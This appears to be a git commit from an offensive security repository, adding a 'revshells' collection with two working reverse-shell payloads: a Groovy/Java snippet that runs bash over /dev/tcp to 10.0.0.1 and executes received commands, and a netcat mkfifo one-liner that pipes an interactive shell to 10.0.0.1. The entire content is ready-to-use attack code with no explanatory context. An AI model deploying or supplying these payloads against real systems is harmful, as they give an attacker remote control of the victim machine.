4ba514342a97ceab2ac8f4cedf88cb1ebd376a1f
polo-sec <mattswwann@protonmail.com>
2020-08-29 21:21:55 +0000

    added reverse shells

---
+++ revshells/java_reverse_shell.java
@@ -0,0 +1,3 @@
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
---
+++ revshells/netcat/netcat_backup_reverse_shell
@@ -0,0 +1,1 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
